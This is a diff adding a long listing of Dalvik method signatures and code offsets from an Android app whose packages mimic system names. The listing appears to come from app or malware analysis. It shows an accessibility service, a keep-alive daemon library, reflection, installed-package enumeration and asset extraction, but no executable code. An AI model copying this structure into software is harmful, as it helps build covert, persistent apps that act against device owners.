@@ -1,0 +1,782 @@
+Lcom/android/bclearservice/R$drawable;-><init>()V [access_flags=public constructor] @ 0x56f8
+Ljava/lang/Object;-><init>()V
+Lcom/android/bclearservice/R$mipmap;-><init>()V [access_flags=public constructor] @ 0x5710
+Lcom/android/bclearservice/R$string;-><init>()V [access_flags=public constructor] @ 0x5728
+Lcom/android/bclearservice/R$style;-><init>()V [access_flags=public constructor] @ 0x5740
+Lcom/android/bclearservice/R$xml;-><init>()V [access_flags=public constructor] @ 0x5758
+Lcom/android/bvgservice/ASDAccess;-><init>()V [access_flags=public constructor] @ 0x5770
+Landroid/accessibilityservice/AccessibilityService;-><init>()V
+Lcom/android/bvgservice/ASDAccess;->a()V [access_flags=public static] @ 0x5788
+Ljava/lang/Class;->getMethod(Ljava/lang/String; [Ljava/lang/Class;)Ljava/lang/reflect/Method;
+Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object; [Ljava/lang/Object;)Ljava/lang/Object;
+Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
+Lcom/android/bvgservice/a/d/j;->c()Z [access_flags=public static] @ 0xc1d4
+Lcom/android/bvgservice/a/d/j;->e()Z [access_flags=public static] @ 0xc260
+Lcom/android/bvgservice/g;->a()Lcom/android/bvgservice/g; [access_flags=public static] @ 0xd7d4
+Lcom/android/bvgservice/ASDAccess;->onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V [access_flags=public] @ 0x5840
+Lcom/android/bvgservice/a/d/j;->e(Landroid/content/Context;)Z [access_flags=public static] @ 0xc298
+Lcom/android/bvgservice/ASDAccess;->onCreate()V [access_flags=public] @ 0x58d0
+Landroid/accessibilityservice/AccessibilityService;->onCreate()V
+Lcom/android/bvgservice/ASDAccess;->onInterrupt()V [access_flags=public] @ 0x5904
+Lcom/android/bvgservice/ClearService;-><init>()V [access_flags=public constructor] @ 0x5930
+Landroid/app/IntentService;-><init>(Ljava/lang/String;)V
+Lcom/android/bvgservice/ClearService;->onHandleIntent(Landroid/content/Intent;)V [access_flags=protected] @ 0x594c
+Lcom/android/bvgservice/b;->a(Ljava/lang/String; [Ljava/lang/String;)Ljava/util/List; [access_flags=public final] @ 0xcb80
+Ljava/io/File;->delete()Z
+Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+Lcom/android/bvgservice/b;->b(Ljava/lang/String;)Z [access_flags=final] @ 0xcc38
+Lcom/android/bvgservice/b;-><init>(Landroid/content/Context;)V [access_flags=constructor] @ 0xc6a4
+Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;
+Lcom/android/bvgservice/b;->a(Ljava/util/ArrayList;)Ljava/lang/String; [access_flags=public final] @ 0xc91c
+Ljava/util/Iterator;->next()Ljava/lang/Object;
+Ljava/util/List;->get(I)Ljava/lang/Object;
+Ljava/util/List;->iterator()Ljava/util/Iterator;
+Lcom/android/bvgservice/b;->a(F)Ljava/lang/String; [access_flags=public static] @ 0xc804
+Ljava/util/ArrayList;-><init>()V
+Lcom/android/bvgservice/b;->a(Ljava/io/File;)F [access_flags=public static] @ 0xc748
+Landroid/content/Intent;->getAction()Ljava/lang/String;
+Lcom/android/bvgservice/b;->a()Ljava/util/List; [access_flags=public final] @ 0xc984
+Lcom/android/bvgservice/b;->a(Ljava/lang/String;)F [access_flags=public final] @ 0xc898
+Ljava/util/Iterator;->hasNext()Z
+Ljava/util/List;->size()I
+Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
+Lcom/android/bvgservice/FileProvider$a;->a(Landroid/net/Uri;)Ljava/io/File; [access_flags=public abstract] @ 0x0
+Lcom/android/bvgservice/FileProvider$b;-><init>(Ljava/lang/String;)V [access_flags=public constructor] @ 0x5ab0
+Ljava/util/HashMap;-><init>()V
+Lcom/android/bvgservice/FileProvider$b;->a(Landroid/net/Uri;)Ljava/io/File; [access_flags=public final] @ 0x5adc
+Landroid/net/Uri;->getEncodedPath()Ljava/lang/String;
+Ljava/lang/String;->substring(I)Ljava/lang/String;
+Ljava/io/File;->getPath()Ljava/lang/String;
+Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
+Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+Landroid/net/Uri;->decode(Ljava/lang/String;)Ljava/lang/String;
+Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+Ljava/lang/String;->substring(I I)Ljava/lang/String;
+Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String;)V
+Ljava/lang/String;->indexOf(I I)I
+Ljava/lang/SecurityException;-><init>(Ljava/lang/String;)V
+Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;
+Ljava/io/File;->getCanonicalFile()Ljava/io/File;
+Lcom/android/bvgservice/FileProvider;-><clinit>()V [access_flags=static constructor] @ 0x5be0
+Ljava/io/File;-><init>(Ljava/lang/String;)V
+Lcom/android/bvgservice/FileProvider;-><init>()V [access_flags=public constructor] @ 0x5c30
+Landroid/content/ContentProvider;-><init>()V
+Lcom/android/bvgservice/FileProvider;->a(Landroid/content/Context; Ljava/lang/String;)Lcom/android/bvgservice/FileProvider$a; [access_flags=private static] @ 0x5c48
+Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
+Landroid/content/res/XmlResourceParser;->getName()Ljava/lang/String;
+Landroid/content/pm/ProviderInfo;->loadXmlMetaData(Landroid/content/pm/PackageManager; Ljava/lang/String;)Landroid/content/res/XmlResourceParser;
+Landroid/content/res/XmlResourceParser;->getAttributeValue(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String; Ljava/lang/Throwable;)V
+Lcom/android/bvgservice/FileProvider;->a(Ljava/io/File; [Ljava/lang/String;)Ljava/io/File; [access_flags=private static varargs] @ 0x5e98
+Landroid/content/Context;->getCacheDir()Ljava/io/File;
+Landroid/content/pm/PackageManager;->resolveContentProvider(Ljava/lang/String; I)Landroid/content/pm/ProviderInfo;
+Landroid/content/res/XmlResourceParser;->next()I
+Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
+Ljava/util/HashMap;->put(Ljava/lang/Object; Ljava/lang/Object;)Ljava/lang/Object;
+Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z
+Landroid/content/Context;->getFilesDir()Ljava/io/File;
+Lcom/android/bvgservice/FileProvider;->attachInfo(Landroid/content/Context; Landroid/content/pm/ProviderInfo;)V [access_flags=public] @ 0x5ed4
+Landroid/content/ContentProvider;->attachInfo(Landroid/content/Context; Landroid/content/pm/ProviderInfo;)V
+Lcom/android/bvgservice/FileProvider;->delete(Landroid/net/Uri; Ljava/lang/String; [Ljava/lang/String;)I [access_flags=public] @ 0x5f2c
+Lcom/android/bvgservice/FileProvider;->getType(Landroid/net/Uri;)Ljava/lang/String; [access_flags=public] @ 0x5f5c
+Ljava/io/File;->getName()Ljava/lang/String;
+Landroid/webkit/MimeTypeMap;->getSingleton()Landroid/webkit/MimeTypeMap;
+Ljava/lang/String;->lastIndexOf(I)I
+Landroid/webkit/MimeTypeMap;->getMimeTypeFromExtension(Ljava/lang/String;)Ljava/lang/String;
+Lcom/android/bvgservice/FileProvider;->insert(Landroid/net/Uri; Landroid/content/ContentValues;)Landroid/net/Uri; [access_flags=public] @ 0x5fc0
+Ljava/lang/UnsupportedOperationException;-><init>(Ljava/lang/String;)V
+Lcom/android/bvgservice/FileProvider;->openFile(Landroid/net/Uri; Ljava/lang/String;)Landroid/os/ParcelFileDescriptor; [access_flags=public] @ 0x5ff4
+Landroid/os/ParcelFileDescriptor;->open(Ljava/io/File; I)Landroid/os/ParcelFileDescriptor;
+Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+Lcom/android/bvgservice/FileProvider;->query(Landroid/net/Uri; [Ljava/lang/String; Ljava/lang/String; [Ljava/lang/String; Ljava/lang/String;)Landroid/database/Cursor; [access_flags=public] @ 0x60c0
+Ljava/io/File;->length()J
+Ljava/lang/System;->arraycopy(Ljava/lang/Object; I Ljava/lang/Object; I I)V
+Landroid/database/MatrixCursor;->addRow([Ljava/lang/Object;)V
+Landroid/database/MatrixCursor;-><init>([Ljava/lang/String; I)V
+Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
+Lcom/android/bvgservice/FileProvider;->update(Landroid/net/Uri; Landroid/content/ContentValues; Ljava/lang/String; [Ljava/lang/String;)I [access_flags=public] @ 0x6190
+Lcom/android/bvgservice/HomeService$1;-><init>(Lcom/android/bvgservice/HomeService;)V [access_flags=constructor] @ 0x61b0
+Lcom/android/bvgservice/HomeService$1;->run()V [access_flags=public final] @ 0x61cc
+Lcom/android/bvgservice/a;->a(Ljava/lang/String;)Ljava/lang/String; [access_flags=public static] @ 0xc5d0
+Lcom/android/bvgservice/HomeService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+Landroid/content/Intent;-><init>(Ljava/lang/String;)V
+Lcom/android/bvgservice/HomeService;->getPackageName()Ljava/lang/String;
+Landroid/content/Intent;->setClassName(Ljava/lang/String; Ljava/lang/String;)Landroid/content/Intent;
+Lcom/android/bvgservice/HomeService$Inner;-><init>()V [access_flags=public constructor] @ 0x6228
+Lcom/android/bvgservice/HomeService$Inner;->onHandleIntent(Landroid/content/Intent;)V [access_flags=protected] @ 0x6244
+Landroid/app/Notification;-><init>()V
+Lcom/android/bvgservice/HomeService$Inner;->startForeground(I Landroid/app/Notification;)V
+Lcom/what/device/util/job/b$a;-><init>()V [access_flags=public constructor] @ 0x6274
+Lcom/what/device/util/job/b$a;->attachInterface(Landroid/os/IInterface; Ljava/lang/String;)V
+Landroid/os/Binder;-><init>()V
+Lcom/what/device/util/job/b$a;->onTransact(I Landroid/os/Parcel; Landroid/os/Parcel; I)Z [access_flags=public] @ 0x62ac
+Landroid/os/Binder;->onTransact(I Landroid/os/Parcel; Landroid/os/Parcel; I)Z
+Landroid/os/Parcel;->writeString(Ljava/lang/String;)V
+Lcom/android/bvgservice/HomeService$a;-><init>()V [access_flags=constructor] @ 0x62e8
+Lcom/android/bvgservice/HomeService$b;-><init>(Lcom/android/bvgservice/HomeService; Landroid/os/Looper;)V [access_flags=public constructor] @ 0x6300
+Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
+Lcom/android/bvgservice/HomeService$b;->handleMessage(Landroid/os/Message;)V [access_flags=public final] @ 0x631c
+Lcom/android/bvgservice/a/a/h;->a(Landroid/content/Context; Landroid/os/Handler;)Lcom/android/bvgservice/a/a/h; [access_flags=public static] @ 0x7d40
+Lcom/android/bvgservice/a/a/g;-><init>(Landroid/content/Context; Lcom/android/bvgservice/a/c/a; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x7cc8
+Lcom/android/bvgservice/a/a/b;->a()V [access_flags=public final] @ 0x7138
+Lcom/android/bvgservice/a/a/e;->a()V [access_flags=public final] @ 0x7b44
+Lcom/android/bvgservice/a/a/c;->a()V [access_flags=public final] @ 0x7198
+Lcom/android/bvgservice/a/a/m;->a(Landroid/content/Context; Landroid/os/Handler;)Lcom/android/bvgservice/a/a/m; [access_flags=public static] @ 0x8704
+Lcom/android/bvgservice/a/a/m;->b()V [access_flags=public final] @ 0x8804
+Lcom/android/bvgservice/a/a/f;->a(I)V [access_flags=public static] @ 0x7bf8
+Lcom/android/bvgservice/a/a/e;-><init>(Landroid/content/Context; Lcom/android/bvgservice/a/c/a; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x7438
+Lcom/android/bvgservice/a/a/j;->a(Landroid/content/Context; Landroid/os/Handler;)Lcom/android/bvgservice/a/a/j; [access_flags=public static] @ 0x83bc
+Lcom/android/bvgservice/a/a/m;->a()V [access_flags=public final] @ 0x877c
+Lcom/android/bvgservice/a/d/j;->a(Landroid/content/Context;)V [access_flags=public static] @ 0xbfa4
+Lcom/android/bvgservice/a/a/l;->a()V [access_flags=public final] @ 0x86bc
+Lcom/android/bvgservice/a/a/b;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x711c
+Lcom/android/bvgservice/a/a/a;->a(Landroid/content/Context; Landroid/os/Handler;)Lcom/android/bvgservice/a/a/a; [access_flags=public static] @ 0x6d18
+Lcom/android/bvgservice/a/a/c;-><init>(Landroid/content/Context; Lcom/android/bvgservice/a/c/a; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x7180
+Lcom/android/bvgservice/a/a/j;->a()V [access_flags=public final] @ 0x8594
+Lcom/android/bvgservice/a/a/k;->a()V [access_flags=public final] @ 0x8678
+Lcom/android/bvgservice/a/a/d;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x7288
+Lcom/android/bvgservice/a/a/h;->a()V [access_flags=public final] @ 0x7e08
+Lcom/android/bvgservice/a/a/j;->a(Lcom/android/bvgservice/a/c/a;)V [access_flags=public final] @ 0x8640
+Lcom/android/bvgservice/a/a/g;->a()V [access_flags=public final] @ 0x7ce0
+Lcom/android/bvgservice/HomeService$b;->sendEmptyMessageDelayed(I J)Z
+Lcom/android/bvgservice/a/a/l;-><init>(Landroid/content/Context; Lcom/android/bvgservice/a/c/a; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x86a4
+Lcom/android/bvgservice/a/a/a;->a()V [access_flags=public final] @ 0x7020
+Lcom/android/bvgservice/a/a/k;-><init>(Landroid/content/Context; Lcom/android/bvgservice/a/c/a; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x8660
+Lcom/android/bvgservice/a/a/d;->a()Z [access_flags=public final] @ 0x72a8
+Lcom/android/bvgservice/HomeService$b;->sendEmptyMessage(I)Z
+Lcom/android/bvgservice/HomeService$b;->obtainMessage(I)Landroid/os/Message;
+Lcom/android/bvgservice/HomeService;-><init>()V [access_flags=public constructor] @ 0x6500
+Landroid/app/Service;-><init>()V
+Lcom/android/bvgservice/HomeService;->onBind(Landroid/content/Intent;)Landroid/os/IBinder; [access_flags=public] @ 0x6524
+Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
+Lcom/android/bvgservice/HomeService;->onCreate()V [access_flags=public] @ 0x657c
+Landroid/content/Intent;-><init>(Landroid/content/Context; Ljava/lang/Class;)V
+Lcom/android/bvgservice/d;->a(Landroid/content/Context; Landroid/os/Handler;)Lcom/android/bvgservice/d; [access_flags=public static] @ 0xd130
+Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V
+Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;
+Landroid/os/HandlerThread;-><init>(Ljava/lang/String; I)V
+Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;
+Lcom/android/bvgservice/HomeService;->getMainLooper()Landroid/os/Looper;
+Lcom/android/bvgservice/d$1;-><init>(Lcom/android/bvgservice/d;)V [access_flags=constructor] @ 0xcff8
+Lcom/android/bvgservice/HomeService;->startForeground(I Landroid/app/Notification;)V
+Landroid/app/Service;->onCreate()V
+Landroid/content/IntentFilter;-><init>()V
+Ljava/lang/Exception;->printStackTrace()V
+Landroid/os/HandlerThread;->start()V
+Lcom/android/bvgservice/HomeService;->onDestroy()V [access_flags=public] @ 0x66b8
+Landroid/app/Service;->onDestroy()V
+Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
+Lcom/android/bvgservice/HomeService;->onStartCommand(Landroid/content/Intent; I I)I [access_flags=public] @ 0x66f8
+Landroid/os/Message;->sendToTarget()V
+Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;
+Lcom/android/bvgservice/MainApp;-><init>()V [access_flags=public constructor] @ 0x6804
+Landroid/app/Application;-><init>()V
+Lcom/android/bvgservice/MainApp;->a(Landroid/content/Context;)Z [access_flags=private static] @ 0x681c
+Landroid/content/Context;->getPackageName()Ljava/lang/String;
+Ljava/lang/Object;->getClass()Ljava/lang/Class;
+Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String; [Ljava/lang/Class;)Ljava/lang/reflect/Method;
+Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
+Ljava/lang/Integer;->intValue()I
+Landroid/os/Binder;->getCallingUid()I
+Lcom/android/bvgservice/MainApp;->attachBaseContext(Landroid/content/Context;)V [access_flags=protected] @ 0x68f0
+Lcom/marswin89/marsdaemon/DaemonConfigurations;-><init>(Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonConfiguration; Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonConfiguration; Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonListener;)V [access_flags=public constructor] @ 0xda78
+Ljava/lang/StringBuilder;-><init>()V
+Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonConfiguration;-><init>(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)V [access_flags=public constructor] @ 0xda2c
+Lcom/marswin89/marsdaemon/DaemonClient;-><init>(Lcom/marswin89/marsdaemon/DaemonConfigurations;)V [access_flags=public constructor] @ 0xd86c
+Ljava/lang/Class;->getCanonicalName()Ljava/lang/String;
+Lcom/android/bvgservice/MainApp;->getPackageName()Ljava/lang/String;
+Lcom/marswin89/marsdaemon/DaemonClient;->onAttachBaseContext(Landroid/content/Context;)V [access_flags=public] @ 0xd9d8
+Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
+Lcom/android/bvgservice/MainApp;->onCreate()V [access_flags=public] @ 0x698c
+Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
+Lcom/what/device/util/DaemonService;->a(Landroid/content/Context;)V [access_flags=public static] @ 0xe150
+Lcom/android/bvgservice/MainApp;->getApplicationContext()Landroid/content/Context;
+Lcom/android/bvgservice/a/d/j;->f(Landroid/content/Context;)Z [access_flags=public static] @ 0xc30c
+Lcom/what/device/util/a/a;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0xe28c
+Lcom/android/bvgservice/a/d/j;->d(Landroid/content/Context;)V [access_flags=public static] @ 0xc1f8
+Landroid/app/Application;->onCreate()V
+Landroid/app/ActivityThread;->currentProcessName()Ljava/lang/String;
+Lcom/android/bvgservice/a/d/j;->c(Landroid/content/Context;)V [access_flags=public static] @ 0xc0a8
+Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
+Lcom/android/bvgservice/a/a/i;-><init>(Landroid/content/Context; Lcom/android/bvgservice/a/c/a; Landroid/os/Handler;)V [access_flags=public constructor] @ 0x6b24
+Lcom/android/bvgservice/a/a/i;->a(Lorg/json/JSONObject; Ljava/lang/String;)V [access_flags=protected static] @ 0x6b48
+Lcom/android/bvgservice/a/d/a;->a(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String; [access_flags=public static] @ 0x9530
+Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;
+Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+Lcom/android/bvgservice/a/d/e;->a(Ljava/io/Closeable;)V [access_flags=public static final] @ 0xb05c
+Ljava/io/ByteArrayOutputStream;->toByteArray()[B
+Ljava/io/ByteArrayOutputStream;-><init>()V
+Ljava/io/ByteArrayInputStream;-><init>([B)V
+Lcom/android/bvgservice/a/d/d;->a(Ljava/lang/String; [Ljava/io/InputStream; Ljava/io/OutputStream;)V [access_flags=public static] @ 0xab8c
+Lorg/json/JSONObject;->toString()Ljava/lang/String;
+Ljava/lang/String;-><init>([B Ljava/lang/String;)V
+Lcom/android/bvgservice/a/a/a;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=private constructor] @ 0x6cfc
+Lcom/android/bvgservice/a/a/a;->c()Z [access_flags=private] @ 0x6d44
+Lcom/what/device/util/h;->e(Landroid/content/Context;)Z [access_flags=public static] @ 0xed60
+Landroid/os/Handler;->sendEmptyMessage(I)Z
+Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
+Lcom/android/bvgservice/a/d/f;->e(Ljava/io/File;)Z [access_flags=public static] @ 0xb85c
+Ljava/io/File;->exists()Z
+Lcom/android/bvgservice/a/d/f;->c(Ljava/io/File;)Ljava/lang/String; [access_flags=public static] @ 0xb5c0
+Lcom/android/bvgservice/a/d/f;->a(Landroid/content/Context;)Ljava/io/File; [access_flags=public static] @ 0xb094
+Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
+Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
+Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
+Lcom/what/device/util/g;->a(Landroid/content/Context;)Ljava/lang/String; [access_flags=public static] @ 0xe990
+Lcom/android/bvgservice/a/d/f;->d(Ljava/io/File;)Ljava/io/File; [access_flags=public static] @ 0xb698
+Lcom/android/bvgservice/a/d/f;->a(Ljava/io/InputStream;)Ljava/lang/String; [access_flags=public static] @ 0xb0bc
+Lcom/android/bvgservice/a/d/f;->a(Landroid/content/Context; Ljava/lang/String; Ljava/io/File;)Z [access_flags=public static] @ 0xb1a8
+Lcom/android/bvgservice/a/d/f;->a(Ljava/io/File; Ljava/io/File;)Z [access_flags=public static] @ 0xb288
+Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
+Landroid/content/Context;->getDir(Ljava/lang/String; I)Ljava/io/File;
+Ljava/io/File;->listFiles()[Ljava/io/File;
+Lcom/android/bvgservice/a/a/a;->b()Z [access_flags=public final] @ 0x70a4
+Ljava/io/IOException;->printStackTrace()V
+Landroid/text/TextUtils;->equals(Ljava/lang/CharSequence; Ljava/lang/CharSequence;)Z
+Landroid/content/res/AssetManager;->list(Ljava/lang/String;)[Ljava/lang/String;
+Landroid/os/Handler;->obtainMessage(I)Landroid/os/Message;
+Lcom/android/bvgservice/a/a/c;->a(Lorg/json/JSONObject; Ljava/lang/String;)V
+Landroid/os/Handler;->sendEmptyMessageDelayed(I J)Z
+Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+Lcom/android/bvgservice/a/d/f;->a(Ljava/io/File;)V [access_flags=public static] @ 0xb158
+Lcom/android/bvgservice/a/b/c;->a(Landroid/content/Context;)Lorg/json/JSONObject; [access_flags=public static] @ 0x8cbc
+Ljava/io/File;->getParentFile()Ljava/io/File;
+Landroid/content/Context;->getApplicationContext()Landroid/content/Context;
+Lcom/android/bvgservice/c;->a(Landroid/content/Context; Z)V [access_flags=public static] @ 0xccc0
+Lcom/android/bvgservice/e;->a(Landroid/content/Context; Ljava/lang/String;)Z [access_flags=public static] @ 0xd330
+Lcom/android/bvgservice/c;->a(Landroid/content/Context;)Z [access_flags=public static] @ 0xce74
+Lcom/android/bvgservice/a/a/e$a;-><init>()V [access_flags=constructor] @ 0x73f4
+Lcom/android/bvgservice/a/a/e$a;-><init>(Ljava/lang/String;)V [access_flags=constructor] @ 0x7414
+Lcom/android/bvgservice/a/a/e;->a(Lcom/android/bvgservice/a/c/a;)Lcom/android/bvgservice/a/a/e$a; [access_flags=private] @ 0x7450
+Lcom/android/bvgservice/a/a/e;->a(Landroid/content/Context; Lcom/android/bvgservice/a/a/e$a;)Z [access_flags=private static] @ 0x7998
+Lcom/android/bvgservice/a/a/e;->a(Ljava/lang/String;)Lorg/json/JSONObject; [access_flags=private static] @ 0x78b0
+Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
+Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
+Lcom/android/bvgservice/a/a/e;->a(Lcom/android/bvgservice/a/c/c;)Lcom/android/bvgservice/a/a/e$a; [access_flags=private] @ 0x75e8
+Lorg/json/JSONObject;->has(Ljava/lang/String;)Z
+Ljava/lang/Exception;->toString()Ljava/lang/String;
+Lcom/android/bvgservice/a/c/c;-><init>()V [access_flags=public constructor] @ 0x94a0
+Ljava/io/ByteArrayOutputStream;->size()I
+Lcom/android/bvgservice/a/d/a;->b(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String; [access_flags=public static] @ 0x96fc
+Lcom/android/bvgservice/a/d/d;->a(Ljava/lang/String; Ljava/io/OutputStream;)V [access_flags=public static] @ 0xaa38
+Ljava/io/ByteArrayOutputStream;-><init>(I)V
+Lcom/what/device/util/g;->a(Landroid/content/Context; Ljava/lang/String;)Z [access_flags=public static] @ 0xea3c
+Ljava/io/File;->isDirectory()Z
+Lcom/android/bvgservice/a/d/d;->a(Ljava/lang/String; Ljava/io/File;)Z [access_flags=public static final] @ 0xad60
+Ljava/io/File;->mkdir()Z
+Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I
+Lcom/android/bvgservice/a/b/c;->a(Landroid/content/Context; Z Ljava/lang/String;)Lorg/json/JSONObject; [access_flags=public static] @ 0x8d04
+Lcom/android/bvgservice/a/b/c;->e(Landroid/content/Context;)Lorg/json/JSONObject; [access_flags=public static] @ 0x9058
+Lcom/android/bvgservice/a/a/g;->a(Lorg/json/JSONObject; Ljava/lang/String;)V
+Lcom/android/bvgservice/a/a/h;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=private constructor] @ 0x7d24
+Landroid/os/Handler;->sendMessageDelayed(Landroid/os/Message; J)Z
+Lcom/android/bvgservice/a/a/h;->c()J [access_flags=private] @ 0x7db8
+Ljava/lang/System;->currentTimeMillis()J
+Lcom/android/bvgservice/a/a/h;->b()J [access_flags=private] @ 0x7d6c
+Landroid/content/SharedPreferences;->getLong(Ljava/lang/String; J)J
+Landroid/content/Context;->getSharedPreferences(Ljava/lang/String; I)Landroid/content/SharedPreferences;
+Lcom/android/bvgservice/a/a/j;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=private constructor] @ 0x7f08
+Ljava/util/List;->remove(Ljava/lang/Object;)Z
+Ljava/util/List;->isEmpty()Z
+Lcom/android/bvgservice/a/a/j;->a(Landroid/content/Context;)J [access_flags=private] @ 0x7f30
+Lcom/android/bvgservice/a/d/j;->b(Landroid/content/Context;)Z [access_flags=public static] @ 0xc01c
+Ljava/util/List;->addAll(Ljava/util/Collection;)Z
+Lcom/android/bvgservice/a/a/j;->b(J)Z [access_flags=private] @ 0x853c
+Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;
+Lcom/android/bvgservice/a/c/b;-><init>()V [access_flags=public constructor] @ 0x9320
+Lcom/android/bvgservice/a/b/c;->b(Landroid/content/Context;)Lorg/json/JSONObject; [access_flags=public static] @ 0x8e1c
+Lcom/android/bvgservice/a/a/j;->a(J)Z [access_flags=private] @ 0x83e8
+Landroid/os/Handler;->removeMessages(I)V
+Lcom/android/bvgservice/a/d/j;->b()Z [access_flags=public static] @ 0xbff8
+Lcom/android/bvgservice/a/c/b;->b(Lorg/json/JSONObject;)V [access_flags=public final] @ 0x93b8
+Ljava/util/List;->clear()V
+Lcom/android/bvgservice/a/a/j;->a(Ljava/lang/String;)Z [access_flags=private] @ 0x8440
+Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String; J)Landroid/content/SharedPreferences$Editor;
+Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+Landroid/content/SharedPreferences$Editor;->commit()Z
+Lcom/android/bvgservice/a/a/j;->a([Ljava/lang/String;)Z [access_flags=private] @ 0x84c4
+Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String; I)Landroid/content/pm/PackageInfo;
+Lcom/android/bvgservice/a/a/k;->a(Lorg/json/JSONObject; Ljava/lang/String;)V
+Lcom/android/bvgservice/a/b/c;->c(Landroid/content/Context;)Lorg/json/JSONObject; [access_flags=public static] @ 0x8eec
+Lcom/android/bvgservice/a/a/l;->a(Lorg/json/JSONObject; Ljava/lang/String;)V
+Lcom/android/bvgservice/a/b/c;->d(Landroid/content/Context;)Lorg/json/JSONObject; [access_flags=public static] @ 0x8f94
+Lcom/android/bvgservice/a/a/m;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=private constructor] @ 0x86e8
+Lcom/android/bvgservice/a/a/m;->c()J [access_flags=private] @ 0x8730
+Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;
+Ljava/util/Calendar;->setTimeInMillis(J)V
+Ljava/util/Calendar;->get(I)I
+Lcom/android/bvgservice/a/d/h;-><init>()V [access_flags=public constructor] @ 0x886c
+Lcom/android/bvgservice/a/d/c;-><init>()V [access_flags=public constructor] @ 0x8884
+Lcom/android/bvgservice/a/d/c;->toString()Ljava/lang/String; [access_flags=public] @ 0x889c
+Lcom/android/bvgservice/a/d/c;->a(Lorg/json/JSONObject;)V
+Lorg/json/JSONObject;-><init>()V
+Lcom/android/bvgservice/a/b/a;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0x88dc
+Lcom/what/device/util/j;->b()Lcom/what/device/util/b; [access_flags=public final synchronized] @ 0xf148
+Lcom/what/device/util/j;->a(Landroid/content/Context;)Lcom/what/device/util/j; [access_flags=public static synchronized] @ 0xef84
+Lcom/android/bvgservice/a/b/a;->a(Lorg/json/JSONObject;)V [access_flags=public final] @ 0x8908
+Lorg/json/JSONObject;->put(Ljava/lang/String; Z)Lorg/json/JSONObject;
+Lorg/json/JSONObject;->put(Ljava/lang/String; Ljava/lang/Object;)Lorg/json/JSONObject;
+Lcom/android/bvgservice/a/b/b;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0x89ac
